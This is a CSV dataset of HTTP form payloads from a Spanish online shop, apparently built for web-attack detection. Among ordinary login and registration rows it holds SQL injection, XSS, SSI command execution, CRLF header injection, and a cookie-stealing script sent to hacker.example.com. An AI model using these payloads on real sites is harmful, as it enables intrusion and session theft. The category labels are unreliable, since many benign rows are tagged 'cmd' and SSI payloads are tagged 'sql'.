payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
"registro | peers | at222a1 | Cipriana | Serradell | cornthwaite@clichotel.do | 19247264J | C/ Joventut, 182,  | Alegia | 31510 | Salamanca | 8765134980053757 | Registrar HTTP/1.1",cmd,no,178,0,0,0,1,low
entrar | fuzong | comodida?d | off/ | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | fuzong | comodida?d | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar'OR'a='a | 5299 | Confirmar HTTP/1.1,cmd,no,44,1,0,0,1,medium
"<SCRIPT>alert(""Paros"");</SCRIPT> | 5299 | Confirmar HTTP/1.1",xss,no,60,1,1,0,1,medium
insertar | 5299 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
"registro | mckillop | margraviato | Leonor | Pantiga Corredor | miranoa@enla.web | 36674466T | Mencia Calderon, 170, 13B | Manzanares de Rioja | 05427 | Vizcaya');waitfor delay '0:0:15';-- | 7784731967679465 | Registrar HTTP/1.1",sql,no,228,1,0,0,1,low
"registro | mckillop | margraviato | Leonor | Pantiga Corredor | miranoa@enla.web | 36674466T | Mencia Calderon, 170, 13B | Manzanares de Rioja | 05427 | Vizcaya | 465413385488172 | Registrar HTTP/1.1",cmd,no,199,0,0,0,1,low
"registro | mckillop | margraviato | Leonor | Pantiga Corredor | miranoa@enla.web | 36674466T | Mencia Calderon, 170, 13B | Manzanares de Rioja | 05427 | Vizcaya | 7784731967679465 | Registrar HTTP/1.1",cmd,no,200,0,0,0,1,low
entrar | grey | prEsu80a | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
insertar | 6768 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 6768 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | dirac | instRuIDor-a | Helvetia | Tejera Handal | poli@pavimentosalagon.ga | 22640068H%20 | C/ Mangela S/N,  | Puras | 47360 | Palencia | 6085790746283877 | Registrar HTTP/1.1",cmd,no,186,0,0,0,1,low
"registro | dirac | instRuIDor-a | Helvetia | Tejera Handal | poli@pavimentosalagon.ga | 22640068H | C/ Mangela S/N,  | Puras | 47360 | *Navarra | 6085790746283877 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
"registro | dirac | instRuIDor-a | Helvetia | Tejera Handal | poli@pavimentosalagon.ga | 22640068H | C/ Mangela S/N,  | Puras | 47360 | Palencia | 6085790746283877 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
insertar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | 6090 | Pasar por caja HTTP/1.1,cmd,no,93,0,0,0,1,low
insertar | 6090 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6090 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | januario | entorcarse | on/ | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | 4862paros%22%20style=%22background:url(javascript:alert('Paros')) | Pasar por caja HTTP/1.1,cmd,no,102,1,0,0,1,low
insertar | 4862 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 4862 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | ofcparms | mutabIlidad | Petronio | Pedrol | cadoret@escuelamontessori.pa | 17229359J | Hermanas Sanchez Tamargo, 56  | Moreruela de los Infanzones | ','0');waitfor delay '0:0:15';-- | Huelva | 9991778846189173 | Registrar HTTP/1.1",sql,no,242,1,0,0,1,low
"registro | ofcparms | mutabIlidad | Petronio | Pedrol | cadoret@escuelamontessori.pa | 17229359J | Hermanas Sanchez Tamargo, 56  | Al/ins | 13770 | Huelva | 9991778846189173 | Registrar HTTP/1.1",cmd,no,194,0,0,0,1,low
"registro | ofcparms | mutabIlidad | Petronio | Pedrol | cadoret@escuelamontessori.pa | 17229359J | Hermanas Sanchez Tamargo, 56  | Moreruela de los Infanzones | 13770 | Huelva | 9991778846189173 | Registrar HTTP/1.1",cmd,no,215,0,0,0,1,low
"2<!--#EXEC cmd=""ls /""--> HTTP/1.1",sql,no,33,1,1,0,0,medium
insertarSet-cookie%3A+Tamper%3D1041264011025374727 | 2579 | Confirmar HTTP/1.1,cmd,no,78,0,0,0,1,medium
%7C | 2579 | Confirmar HTTP/1.1,cmd,no,31,0,0,0,1,medium
insertar | 2579 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 2579 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
2 | Vino Rioja | 85 | 63 | | HTTP/1.1,cmd,no,37,0,0,0,1,medium
entrar | any%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 2anc580a95r | off | Entrar HTTP/1.1,cmd,no,95,0,0,0,1,low
entrar | mirella | 2anc580a95r | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | | | Pasar por caja HTTP/1.1,cmd,no,38,0,0,0,1,medium
insertar | 7950 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7950 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | dana | ibe2io | Tiago | Burunat Jaraba | klyaro@hostrofessional.com.kg | 26315307H | Plza. Del Ingenier+o Orueta+,* 77, 7B | Plasenzuela | 40194 | Albacete | 2227850098385549 | Registrar HTTP/1.1",cmd,no,206,0,0,0,1,low
entrar | ohio | acerrador'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | off | Entrar HTTP/1.1,sql,no,113,1,0,0,1,low
"entrar | ohio | E25299A'Rs,E | off | Entrar HTTP/1.1",cmd,no,52,1,0,0,1,medium
entrar | ohio | acerrador | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | 672 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 672 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
insertar | 1979 | paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,cmd,no,88,1,0,0,1,low
insertar | 1979 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1979 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | hartmann | al55nza | Randolfo | Rovirola Noiran | semmelrogge@spainpharma.zm | 73500117Ybob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Pl. Aranjuez, S/N  | Sobremunt | 18127 | Tarragona | 1198702099336688 | Registrar HTTP/1.1",xss,no,240,0,1,0,1,low
"registro | ','0','0','0','0');waitfor delay '0:0:15';-- | al55nza | Randolfo | Rovirola Noiran | semmelrogge@spainpharma.zm | 73500117Y | Pl. Aranjuez, S/N  | Sobremunt | 18127 | Tarragona | 1198702099336688 | Registrar HTTP/1.1",sql,no,228,1,0,0,1,low
"registro | hartmann | al55nza | Randolfo | Rovirola Noiran | lorre-d@uell2@simulacion-credito.ma | 73500117Y | Pl. Aranjuez, S/N  | Sobremunt | 18127 | Tarragona | 1198702099336688 | Registrar HTTP/1.1",cmd,no,201,0,0,0,1,low
entrar | wendi | tracaM/unda''na | on | Entrar HTTP/1.1,cmd,no,55,1,0,0,1,medium
insertar | 8453 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8453 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"entrar | auton | ag,uiJo66'35or | on | Entrar HTTP/1.1",cmd,no,54,1,0,0,1,medium
entrar | auton | gubi9 | on | Entrar HTTP/1.1,cmd,no,45,0,0,0,1,medium
"insertar | 5934 | Confirmar','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,76,1,0,0,1,medium
insertar | 5934 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5934 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"entrar | apollo | n79t,300471 | off | Entrar HTTP/1.1",cmd,no,53,0,0,0,1,medium
"<!--#include file=""archivo_secreto"" --> | 3086 | Pasar por caja HTTP/1.1",sql,no,72,1,1,0,1,medium
insertar | 3086 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | shyokoAND 1=1 | acarrear | off | Entrar HTTP/1.1,cmd,no,57,0,0,0,1,medium
entrar | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | acarrear | off | Entrar HTTP/1.1,cmd,no,95,0,0,0,1,low
entrar | mcmul+l?in | acarrear | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | 5151paros%22%20style=%22background:url(javascript:alert('Paros')) | Confirmar HTTP/1.1,cmd,no,97,1,0,0,1,low
insertar | Set-cookie%3A+Tamper%3D1041264011025374727 | Confirmar HTTP/1.1,cmd,no,74,0,0,0,1,medium
insertar | 5151 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 5151 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | zampino | mILonGa | on | ' AND '1'='1 HTTP/1.1,cmd,no,55,1,0,0,1,medium
entrar | zampino | mILonGa | on/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | zampino | mILonGa | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | 4461 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 4461 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | student'INJECTED_PARAM | ali0557ra | Jaled | Miralles Casola | manni@yiutuve.mk | 37782618N | Travessera De Gracia 53  | Tollos | 23264 | Pontevedra | 5024784015351535 | Registrar HTTP/1.1,cmd,no,199,1,0,0,1,low
registro | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | ali0557ra | Jaled | Miralles Casola | manni@yiutuve.mk | 37782618N | Travessera De Gracia 53  | Tollos | 23264 | Pontevedra | 5024784015351535 | Registrar HTTP/1.1,xss,no,225,0,1,0,1,low
registro | student | ali0557ra | Jaled | Miralles Casola | manni@yiutuve.mk | 37782618N | Travessera De Gracia 53  | Tollos | 23264 | Barcelo*na | 5024784015351535 | Registrar HTTP/1.1,cmd,no,184,0,0,0,1,low
registro | student | ali0557ra | Jaled | Miralles Casola | manni@yiutuve.mk | 37782618N | Travessera De Gracia 53  | Tollos | 23264 | Pontevedra | 5024784015351535 | Registrar HTTP/1.1,cmd,no,184,0,0,0,1,low
registro | marymarg | m1r66m7$o | Barbarina | Hodzic Fajardo | bibb@yksoluap.io | A097A2A7Q | Carlos Piornos 41 11E | Sant Boi de Llobregat | 46507 | Zamora | 5592242504094790 | Registrar HTTP/1.1,cmd,no,196,0,0,0,1,low
registro | marymarg | m1r66m7$o | Barbarina | Hodzic Fajardo | bibb@yksoluap.io | 05554476E | Carlos Piornos 41 11E | Sant Boi de Llobregat | 46507 | Zamora | 5592242504094790 | Registrar HTTP/1.1,cmd,no,196,0,0,0,1,low
"2 | Queso Manchego | 85 | 28 | "" AND ""1""=""1 HTTP/1.1",cmd,no,52,1,0,0,1,medium
entrar | trindy | pinTOR | off/ | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | 4320any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Pasar por caja HTTP/1.1,cmd,no,95,0,0,0,1,low
insertar | 4320 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 4320 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | jada | 0a3gan861 | AsadAND 1=1 | Tarraubella Grajera | seward_sepulvede@promotorareina.bt | 05599581R | Cuesta Del Mercadillo, 30  | Valdemeca | 44367 | Palencia | 2588788031004045 | Registrar HTTP/1.1",cmd,no,212,0,0,0,1,low
"registro | jada | 0a3gan861 | Asad | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | seward_sepulvede@promotorareina.bt | 05599581R | Cuesta Del Mercadillo, 30  | Valdemeca | 44367 | Palencia | 2588788031004045 | Registrar HTTP/1.1",xss,no,320,1,1,0,1,low
"registro | jada | 0a3gan861 | Asad | Tarraubella Grajera | seward_sepulvede@promotorareina.bt | 577B80594V | Cuesta Del Mercadillo, 30  | Valdemeca | 44367 | Palencia | 2588788031004045 | Registrar HTTP/1.1",cmd,no,206,0,0,0,1,low
"registro | jada | 0a3gan861 | Asad | Tarraubella Grajera | seward_sepulvede@promotorareina.bt | 05599581R | Cuesta Del Mercadillo, 30  | Valdemeca | 44367 | Palencia | 2588788031004045 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
insertar | 3796%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Pasar por caja HTTP/1.1,cmd,no,93,0,0,0,1,low
insertar | 3796 | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,cmd,no,91,0,0,0,1,low
insertar | 3796 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 3796 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | terryl | des9erco | Haroid | Dawaher | 'INJECTED_PARAM | 14559882P | C/ Doctor Francisco Saiz Sanz, 159,  | Alberca, La | 03770 | Salamanca | 3772824400880183 | Registrar HTTP/1.1",cmd,no,190,1,0,0,1,low
"registro | clark-st | 4A4R5R | Semiramis | Chapi Vieira | tirard_lamore@biosoftware.cv | 88665105J | Calle Miguel Romero Matinez S/N,  | Sayalonga | 09227 | L?a Ri?oj*a | 2618138569718823 | Registrar HTTP/1.1",cmd,no,208,0,0,0,1,low
"registro | clark-st | 4A4R5R | Semiramis | Chapi Vieira | tirard_lamore@biosoftware.cv | 88665105J | Calle Miguel Romero Matinez S/N,  | Sayalonga | 09227 | Zamora | 2618138569718823 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
entrar | yale | 2NcOJa7 | on' DELETE FROM USERS | Entrar HTTP/1.1,cmd,no,65,1,0,0,1,medium
entrar | yale | d/esp/epI'Tar | on | Entrar HTTP/1.1,cmd,no,52,1,0,0,1,medium
entrar | yale | 2NcOJa7 | on | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
1any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A HTTP/1.1,encoded attack,no,70,0,0,0,0,medium
insertar | 51 | Confirmar HTTP/1.1,cmd,no,34,0,0,0,1,medium
"registro | mirabell | implIcaNte','0');waitfor delay '0:0:15';-- | Yayn | Boliart Jubert | karlatos-woodcroft@joyaseleccion.fr | 90456703A | Avenida Vigo 194  | Olula de Castro | 07195 | Cuenca | 6879168763922210 | Registrar HTTP/1.1",sql,no,233,1,0,0,1,low
registro | mirabell | implIcaNte | Yayn | Boliart Jubert | karlatos-woodcroft@joyaseleccion.fr | 321B59898X | Avenida Vigo 194  | Olula de Castro | 07195 | Cuenca | 6879168763922210 | Registrar HTTP/1.1,cmd,no,202,0,0,0,1,low
3 | Queso Manchego | 85 | 57 | sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,cmd,no,386,0,0,0,1,low
entrar | kolahi45 | pr0to | on | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,176,1,1,0,1,low
"entrar | kolahi45 | 69'c48Ng,7,7A | on | Entrar HTTP/1.1",cmd,no,56,1,0,0,1,medium
entrar | kolahi45 | pr0to | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 7931 | Confirmar HTTP/1.1,cmd,no,90,0,0,0,1,low
insertar | 7931 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 7931 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | winsberg | flagicio | Lihuel | Novell Abenoza | hasserman@clinicadentalsansalvador.ua | 95659491F | Federico Garcia Lorca, 132,  | Riudoms | 36960 | ';waitfor delay '0:0:15';-- | 1343774789684603 | Registrar HTTP/1.1",sql,no,227,1,0,0,1,low
"registro | winsberg | flagicio | Lihuel | Novell Abenoza | hasserman@clinicadentalsansalvador.ua | 95659491F | *Vila-nova, 139  | Riudoms | 36960 | Burgos | 1343774789684603 | Registrar HTTP/1.1",cmd,no,194,0,0,0,1,low
"registro | winsberg | flagicio | Lihuel | Novell Abenoza | hasserman@clinicadentalsansalvador.ua | 95659491F | Federico Garcia Lorca, 132,  | Riudoms | 36960 | Burgos | 1343774789684603 | Registrar HTTP/1.1",cmd,no,206,0,0,0,1,low
"entrar | rogge | mella | on | Entrar"" AND ""1""=""1 HTTP/1.1",cmd,no,57,1,0,0,1,medium
entrar | rogge | mella | on | paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,cmd,no,100,1,0,0,1,low
entrar | rogge | mella | off/ | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
entrar | rogge | mella | on | Entrar HTTP/1.1,cmd,no,45,0,0,0,1,medium
insertar | 8305 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8305 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | gun | imp716a0le | on/ | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
entrar | gun | imp716a0le | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 2545 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
"registro | myong | colOrISmo | Dagmar | Cabane Molas | holton@enigmatico.vu | 91624095F | Don Ferreol Hernandez S/N,  | Calders | 37183 | Salamancaany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 6035116303925311 | Registrar HTTP/1.1",cmd,no,241,0,0,0,1,low
"registro | myong | colOrISmo | Dagmar | Cabane Molas | holton@enigmatico.vu | 91624095F | Don Ferreol Hernandez S/N,  | Calders | 37183 | Salamanca | 6035116303925311 | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org HTTP/1.1",xss,no,226,0,1,0,1,low
"registro | myong | colOrISmo | Dagmar | Cabane Molas | holton@enigmatico.vu | 91624095F | Don Ferreol Hernandez S/N,  | Calders | 37183 | Salamanca | 6035116303925311 | Registrar HTTP/1.1",cmd,no,187,0,0,0,1,low
"entrar | gavens0 | <!--#EXEC cmd=""ls /""--> | on | Entrar HTTP/1.1",sql,no,65,1,1,0,1,medium
entrar | gavens0 | b99e4ic5ino | off/ | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
insertarbob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | 2114 | Pasar por caja HTTP/1.1,xss,no,89,0,1,0,1,low
"insertar | ""><!--#EXEC cmd=""dir ""-->< | Pasar por caja HTTP/1.1",sql,no,63,1,1,0,1,medium
insertar | 2114 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 2114 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
%3F | dann | pate1a | on | Entrar HTTP/1.1,cmd,no,42,0,0,0,1,medium
entrar | dann | pate1a | off/ | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
"2""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,36,1,1,0,0,medium
insertar | 3330 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 3330 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro','0','0','0','0');waitfor delay '0:0:15';-- | lovell | 5gOtA15r0 | Mardoqueo | Zenteno Llunell | gebert.vrdoltak@intg.md | 55492932G | Conde De Las Infantas 30 8?F | Metauten | 10120 | Madrid | 6623716227816095 | Registrar HTTP/1.1",sql,no,240,1,0,0,1,low
registro | lovell | 'OR'a='a | Mardoqueo | Zenteno Llunell | gebert.vrdoltak@intg.md | 55492932G | Conde De Las Infantas 30 8?F | Metauten | 10120 | Madrid | 6623716227816095 | Registrar HTTP/1.1,cmd,no,195,1,0,0,1,low
registro | lovell | 5gOtA15r0 | Mardoqueo | Zenteno Llunell | gebert.vrdoltak@intg.md | 55492932G | Conde De Las Infantas 30 8?F | Metauten | 10120 | Madrid | 6623716227816095 | Registrar HTTP/1.1,cmd,no,196,0,0,0,1,low
"entrar | shoouyu | 06434Q969o | on<!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1",sql,no,75,1,1,0,1,medium
entrar | shoouyu | 06434Q969o | AND 1=1 | Entrar HTTP/1.1,cmd,no,57,0,0,0,1,medium
entrar | shoouyu | 06434Q969o | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
insertar'OR'a='a | 3010 | Confirmar HTTP/1.1,cmd,no,44,1,0,0,1,medium
insertar | 3010 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | bonnar | perillana | Benito | Estruga Barrozzi | offerall@eonon.com.ci | 78627299M | Poetisa Rosalia De Castro, 41, 3?E | Valhermoso de la Fuente | 24174 | Cuenca | 3588478670456559 | Registrar HTTP/1.1",cmd,no,213,0,0,0,1,low
entrar | jasmine | 832t0484as | off | Entrar%3F HTTP/1.1,cmd,no,56,0,0,0,1,medium
entrar | jasmine | 832t0484as | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
2@40 HTTP/1.1,other,no,13,0,0,0,0,high
"insertar | 88 | Confirmar<!--#EXEC cmd=""ls /""--> HTTP/1.1",sql,no,57,1,1,0,1,medium
';waitfor delay '0:0:15';-- | 88 | Confirmar HTTP/1.1,sql,no,53,1,0,0,1,medium
entrar | mylo | Bacin4lL0 | on/ | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
2'INJECTED_PARAM HTTP/1.1,other,no,25,1,0,0,0,high
insertarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | 7990 | Pasar por caja HTTP/1.1,cmd,no,101,0,0,0,1,low
"','0','0','0','0');waitfor delay '0:0:15';-- | 7990 | Pasar por caja HTTP/1.1",sql,no,77,1,0,0,1,medium
insertar | 7990 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 7990 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
Vaciar carrito'INJECTED_PARAM HTTP/1.1,other,no,38,1,0,0,0,medium
"registro | gantt | sae19r8 | Libe' AND '1'='1 | Amusquivar | mccormack@neotelecom.tn | 35453403F | Calle Tamarindo, 118  | Alfambra | 25400 | Madrid | 5272129392938090 | Registrar HTTP/1.1",cmd,no,188,1,0,0,1,low
"registro | gantt | sae19r8 | + | Amusquivar | mccormack@neotelecom.tn | 35453403F | Calle Tamarindo, 118  | Alfambra | 25400 | Madrid | 5272129392938090 | Registrar HTTP/1.1",cmd,no,173,0,0,0,1,low
"registro | gantt | sae19r8 | Libe | Amusquivar | mccormack@neotelecom.tn | 35453403F | Calle Tamarindo, 118  | Cabre?ros* del Monte | 25400 | Madrid | 5272129392938090 | Registrar HTTP/1.1",cmd,no,188,0,0,0,1,low
entrar | catlin | v76c088rA | off'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1,sql,no,115,1,0,0,1,low
entrar | c/arleen | v76c088rA | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | catlin | v76c088rA | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
"1','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,54,1,0,0,1,medium
"insertar | 9089 | "" AND ""1""=""1 HTTP/1.1",cmd,no,39,1,0,0,1,medium
insertar | 9089 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 9089 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | squires | 234O3o | Delva | Junyent | %3F | 07698521F | Carretera Curva De Gracia 198,  | Villar del Pozo | 35420 | Valladolid | 2110433073963447 | Registrar HTTP/1.1",cmd,no,176,0,0,0,1,low
"registro | squires | 234O3o | Delva | Junyent | barrault@custombikesclothes.np | 07698521F | Carretera Curva De Gracia 198,  | Villar del Pozo | 35420 | Valladolid | 2110433073963447 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
"registro | %20 | damasceno | Temistocles | Teruel Villarroel | schneider-krymov@ringringrent.ie | 27982919S | C/ Rafaela Lozana 76, 6-E | Quer | 39813 | Barcelona | 5040261965189529 | Registrar HTTP/1.1",cmd,no,202,0,0,0,1,low
"registro | lyndia | damasceno | Temistocles | Teruel Villarroel | schneider-krymov@ringringrent.ie | 27982919S | C/ Rafaela Lozana 76, 6-E | Quer | 39813 | Barcelona | 5040261965189529 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
entrar | savard | labrera | off | 'OR'a='a HTTP/1.1,cmd,no,51,1,0,0,1,medium
"entrar | savard | robora,ti,v'a | off | Entrar HTTP/1.1",cmd,no,55,1,0,0,1,medium
entrar | savard | labrera | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar%3F | 8816 | Pasar por caja HTTP/1.1,cmd,no,44,0,0,0,1,medium
insertar | 8816 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8816 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | kessiah | es,batimento | Ruth | Burch Echaniz | gandett@cajucar.az | 77572920S | Pl. Eduardo Chillida, 40  | Sanxenxo | 17161 | Zamora | 2803074671836038 | Registrar HTTP/1.1",cmd,no,185,0,0,0,1,low
entrar | nelon | EquIN57erMo | off/ | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | nelon | EquIN57erMo | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
insertar | 3069 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 3069 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar%2B | 346 | Confirmar HTTP/1.1,cmd,no,38,0,0,0,1,medium
"<!--#EXEC cmd=""ls /""--> | 346 | Confirmar HTTP/1.1",sql,no,50,1,1,0,1,medium
insertar | 346 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 346 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
registro | doti | idealismo | Ian | Sacota Xech | alland.soeltoft@aridossanchez.do%00 | 28681618C | C/ Valencia S/N 11A | Pancorbo | 26321 | Alicante | 3366384544522158 | Registrar HTTP/1.1,cmd,no,189,0,0,0,1,low
"registro | <!--#include file=""archivo_secreto"" --> | idealismo | Ian | Sacota Xech | alland.soeltoft@aridossanchez.do | 28681618C | C/ Valencia S/N 11A | Pancorbo | 26321 | Alicante | 3366384544522158 | Registrar HTTP/1.1",sql,no,221,1,1,0,1,low
registro | doti | cub/era | Ian | Sacota Xech | alland.soeltoft@aridossanchez.do | 28681618C | C/ Valencia S/N 11A | Pancorbo | 26321 | Alicante | 3366384544522158 | Registrar HTTP/1.1,cmd,no,184,0,0,0,1,low
